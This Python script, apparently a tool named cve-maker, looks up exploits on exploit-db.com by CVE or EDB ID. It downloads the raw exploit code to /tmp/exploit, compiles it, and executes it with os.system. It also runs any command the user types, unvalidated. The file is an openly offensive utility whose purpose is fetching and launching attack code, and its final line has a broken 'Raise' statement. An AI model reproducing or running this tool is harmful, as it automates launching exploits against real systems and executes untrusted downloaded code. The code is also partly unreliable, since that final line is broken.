#!/usr/bin/env python3

"""
https://github.com/msd0pe-1
Source code put in public domain by msd0pe, no Copyright
Any malicious or illegal activity may be punishable by law
Use at your own risk
"""

class bcolors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    OCRA = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class infos:
    INFO = "[" + bcolors.OCRA + bcolors.BOLD + "?" + bcolors.ENDC + bcolors.ENDC + "] "
    ERROR = "[" + bcolors.RED + bcolors.BOLD + "X" + bcolors.ENDC + bcolors.ENDC + "] "
    GOOD = "[" + bcolors.GREEN + bcolors.BOLD + "+" + bcolors.ENDC + bcolors.ENDC + "] "
    PROCESS = "[" + bcolors.BLUE + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.ENDC + "] "

try:
    import re
    import os
    import urllib
    import requests
    from bs4 import BeautifulSoup

except ImportError:
    print("\n" + infos.ERROR + "Error. Have you installed the requirements properly?")
    print(infos.INFO + "Be sure to run the script as follows:")
    print(infos.INFO + "python3 cve-maker.py ....")
    print(infos.INFO + "./cve-maker.py ....\n")


exploit_db = "https://www.exploit-db.com/"


def Execute(name, name_ext, langage, usage):

    YES = {'Y', 'y', 'YES', 'yes'}
    YES_enter = {'Y', 'y', 'YES', 'yes', ''}
    NO = {'N', 'n', 'NO', 'no'}
    NO_enter = {'N', 'n', 'NO', 'no', ''}

    choice = input(infos.INFO + bcolors.RED + bcolors.BOLD + "RUN THE EXPLOIT WITH THESE PARAMETERS ? (Y)/N : " + bcolors.ENDC + bcolors.ENDC + usage + "\n")

    if choice in YES_enter:
        print("\n" +infos.PROCESS + "RUNNING...\n")
        try:
            os.system(usage)

        except OSError:
            print(infos.ERROR + "Failed to run the exploit ! Maybe you forgot to specify the right langage.\nBe carefull, sometimes, CVE contains not only the payload. Use 'cat /tmp/exploit/" + name_ext + " to verify if it not contains some text.'\n")

    elif choice in NO:
        parameters = input(infos.INFO + "> ENTER YOUR EXECUTION COMMAND : ")
        print("")
        execute = input(infos.INFO + bcolors.RED + bcolors.BOLD + "RUN THE EXPLOIT WITH THESE PARAMETERS ? (Y)/N : " + bcolors.ENDC + bcolors.ENDC + parameters + "\n\n")
        if execute in YES_enter:
            os.system(parameters)

        elif execute in NO:
            Execute(name, name_ext, langage, usage)

    else:
        print("\n" + infos.ERROR + "You must enter a valid letter !\n" + bcolors.ENDC + bcolors.ENDC)
        Execute(name, name_ext, langage, usage)


def Compilation(name, command, langage, remote):

    if langage == "sh":
        pass

    elif langage == "ruby":
        pass

    elif langage == "perl":
        pass

    elif langage == "python":
        pass

    elif langage == "php":
        pass

    else:
        if remote == True:
            pass

        elif remote == None:
            try:
                print(infos.PROCESS + "COMPILING...\n")
                os.system(command)
                print(infos.GOOD + "EXPLOIT COMPILED WITH SUCCESS : " + "/tmp/exploit/" + name + "\n")

            except:
                print("\n" + infos.ERROR + "/!\ Error during the compilation ! /!\ ")
                exit()


def WritePayload(payload, name_ext, langage):

    exploit = open("/tmp/exploit/" + str(name_ext), "wb")
    exploit.write(payload)
    exploit.close()
    print(infos.GOOD + "EXPLOIT CREATED : " + "/tmp/exploit/" + str(name_ext) + "\n")


def FindCVE(site, cve, edb, langage):
    
    global name
    global payload
    global name_ext

    if site == "exploit_db":
        if edb:
            try:
                print("\n" + infos.INFO + "SEARCHING FOR : " + exploit_db + "raw/" + edb)
                sock = urllib.request.urlopen(exploit_db + "raw/" + edb)
                payload = sock.read()
                sock.close()
                name = edb
                error = re.search('Page Not Found', str(payload))

            except AttributeError:
                print("\n" + infos.ERROR + "You are probably using Python2 ! Use Python3 to run the script.\n")

            except urllib.error.HTTPError:
                print("\n" + infos.ERROR + "Exploit not found ! Verify your ECB-ID.\n")
                exit()
       
        elif cve:
            print("\n" + infos.INFO + "SEARCHING FOR : " + exploit_db + "search?cve=" + cve) 
            header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36","X-Requested-With": "XMLHttpRequest"}
            url = exploit_db + "search?cve=" + cve
            sock_cve = requests.get(url, headers = header)
            findme = BeautifulSoup(sock_cve.text, 'html.parser')
            try:
                cve_edb = re.search('exploit_id\"\:\"(.*?)\"\,\"code_type', str(findme)).group(1)
                print(infos.INFO + "DETERMINATION OF THE EDB ID : " + cve_edb)
                sock_edb = urllib.request.urlopen(exploit_db + "raw/" + cve_edb)
                payload = sock_edb.read()
                sock_edb.close()
                name = cve_edb

            except AttributeError:
                print("\n" + infos.ERROR + "CVE name seams to not be correct.\n")

        if langage == "sh":
            name_ext = str(name) + ".sh"
        elif langage == "ruby":
            name_ext = str(name) + ".rb"
        elif langage == "perl":
            name_ext = str(name) + ".pl"
        elif langage == "python":
            name_ext = str(name) + ".py"
        elif langage == "php":
            name_ext = str(name) + ".php"
        elif langage == "c++":
            name_ext = str(name) + ".cpp"
        elif langage == "c":
            name_ext = str(name) + ".c"	   


def CreateDirectory():
    try: 
        os.makedirs("/tmp/exploit")
    except OSError:
        if not os.path.isdir("/tmp/exploit"):
            Raise
